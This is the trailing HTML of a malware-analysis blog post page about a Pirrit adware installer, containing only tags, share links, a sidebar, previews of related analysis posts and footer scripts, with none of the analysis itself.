text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/malware/">malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/pirrit/" class="post-tag no-text-decoration" >pirrit</a> <a href="/tags/pkg/" class="post-tag no-text-decoration" >pkg</a> <a href="/tags/postinstall/" class="post-tag no-text-decoration" >postinstall</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Analyzing%20a%20Pirrit%20adware%20installer%20-%20Tony%20Lambert&url=https%3A%2F%2Fforensicitguy.github.io%2Fanalyzing-pirrit-adware-installer%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Analyzing%20a%20Pirrit%20adware%20installer%20-%20Tony%20Lambert&u=https%3A%2F%2Fforensicitguy.github.io%2Fanalyzing-pirrit-adware-installer%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fforensicitguy.github.io%2Fanalyzing-pirrit-adware-installer%2F&text=Analyzing%20a%20Pirrit%20adware%20installer%20-%20Tony%20Lambert" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fforensicitguy.github.io%2Fanalyzing-pirrit-adware-installer%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <script defer type="module" src="https://cdn.jsdelivr.net/npm/@justinribeiro/share-to-mastodon/+esm"></script> <button class="btn text-start" data-bs-toggle="tooltip" data-bs-placement="top" title="Mastodon" aria-label="Mastodon"> <share-to-mastodon class="share-mastodon" message="Analyzing%20a%20Pirrit%20adware%20installer%20-%20Tony%20Lambert" url="https%3A%2F%2Fforensicitguy.github.io%2Fanalyzing-pirrit-adware-installer%2F"customInstanceList="[{&quot;label&quot;:&quot;mastodon.social&quot;,&quot;link&quot;:&quot;https://mastodon.social/&quot;},{&quot;label&quot;:&quot;mastodon.online&quot;,&quot;link&quot;:&quot;https://mastodon.online/&quot;},{&quot;label&quot;:&quot;fosstodon.org&quot;,&quot;link&quot;:&quot;https://fosstodon.org/&quot;},{&quot;label&quot;:&quot;infosec.exchange&quot;,&quot;link&quot;:&quot;https://infosec.exchange/&quot;}]" > <i class="fa-fw fa-brands fa-mastodon"></i> </share-to-mastodon> </button> <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fforensicitguy.github.io%2Fanalyzing-pirrit-adware-installer%2F&title=Analyzing%20a%20Pirrit%20adware%20installer%20-%20Tony%20Lambert" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit"> <i class="fa-fw fa-brands fa-square-reddit"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/decompiling-jphp-loader-binwalk-cfr/">Decompiling a JPHP Loader with binwalk and cfr</a><li class="text-truncate lh-lg"> <a href="/dissecting-java-pikabot-dropper/">Dissecting a Java Pikabot Dropper</a><li class="text-truncate lh-lg"> <a href="/timelining-malware-vhd-intelligence/">Timelining a Malicious VHD for More Intelligence</a><li class="text-truncate lh-lg"> <a href="/vhd-malware-an-excellent-choice/">Malware via VHD Files, an Excellent Choice</a><li class="text-truncate lh-lg"> <a href="/faster-malware-triage-yara/">Faster Malware Triage with YARA</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">powershell</a> <a class="post-tag btn btn-outline-primary" href="/tags/msi/">msi</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag btn btn-outline-primary" href="/tags/jar/">jar</a> <a class="post-tag btn btn-outline-primary" href="/tags/java/">java</a> <a class="post-tag btn btn-outline-primary" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag btn btn-outline-primary" href="/tags/mshta/">mshta</a> <a class="post-tag btn btn-outline-primary" href="/tags/net/">.net</a></div></section></div><section id="toc-wrapper" class="d-none ps-0 pe-4"><h2 class="panel-heading ps-3 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/powerpoint-macros-olevba/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1641513600" data-df="ll" > Jan 7, 2022 </time><h4 class="pt-0 my-2">Looking at PowerPoint Macros with Olevba</h4><div class="text-muted"><p>In this post I want to walk through analysis of a malicious PowerPoint file using olevba. This tool allows you to view macros within Office documents without opening them. If you want to follow alo...</p></div></div></a></article><article class="col"> <a href="/decoding-webshell-using-nodejs/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1641427200" data-df="ll" > Jan 6, 2022 </time><h4 class="pt-0 my-2">Decoding an Encoded Webshell Using NodeJS</h4><div class="text-muted"><p>In this post I want to walk through a process of using the NodeJS REPL (Read, Eval, Print Loop) to safely decode portions of malware during analysis. If you want to follow along at home, the sample...</p></div></div></a></article><article class="col"> <a href="/extracting-indicators-from-packed-mirai/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1641254400" data-df="ll" > Jan 4, 2022 </time><h4 class="pt-0 my-2">Extracting Indicators from a Packed Mirai Sample</h4><div class="text-muted"><p>Packing is really commonly used by adversary to stump analysis, so in this post I’m going to look at a sample that is really easy to unpack and get indicators from. In this case the sample is Mirai...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/shortcut-to-emotet-ttp-change/" class="btn btn-outline-primary" aria-label="Older" ><p>Shortcut to Emotet, an odd TTP change</p></a> <a href="/analyzing-net-core-single-file-ducktail/" class="btn btn-outline-primary" aria-label="Newer" ><p>Analyzing .NET Core Single File Samples (DUCKTAIL Case Study)</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2024</time> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">powershell</a> <a class="post-tag btn btn-outline-primary" href="/tags/msi/">msi</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag btn btn-outline-primary" href="/tags/jar/">jar</a> <a class="post-tag btn btn-outline-primary" href="/tags/java/">java</a> <a class="post-tag btn btn-outline-primary" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag btn btn-outline-primary" href="/tags/mshta/">mshta</a> <a class="post-tag btn btn-outline-primary" href="/tags/net/">.net</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.29.0/dist/tocbot.min.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener('DOMContentLoaded', function (event) { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
